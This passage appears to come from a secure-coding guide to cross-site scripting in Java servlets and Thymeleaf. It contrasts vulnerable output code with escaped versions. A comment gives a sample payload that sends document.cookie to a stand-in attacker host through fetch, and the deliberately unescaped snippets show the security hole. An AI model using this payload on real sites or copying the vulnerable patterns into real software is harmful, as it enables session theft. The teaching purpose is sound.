String name = request.getParameter("name");
response.getWriter().write("<h1>Hello, " + name + "</h1>"); // reflected XSS

// Attacker sends:  ?name=<script>fetch('https://evil/c?'+document.cookie)</script>
// Browser parses the <script> tag and runs it -> cookie theft.
```
```html
<!-- Thymeleaf misuse: th:utext renders raw, UNescaped HTML -->
<p th:utext="${comment}"></p>   <!-- stored XSS if comment has markup -->
```
*The data is placed into the page as HTML, so any markup in it executes.*

```html
<!-- Thymeleaf th:text HTML-escapes by default: < becomes &lt; -->
<p th:text="${comment}"></p>   <!-- script tags shown as text, not run -->
<h1 th:text="|Hello, ${name}|"></h1>
```
```java
// If you must build HTML in Java, encode in the right context (OWASP Encoder)
import org.owasp.encoder.Encode;
String safe = Encode.forHtml(request.getParameter("name"));
response.getWriter().write("<h1>Hello, " + safe + "</h1>"); // <script> -> &lt;script&gt;
```
*The same `<script>` payload is now displayed as harmless text instead of being executed.*

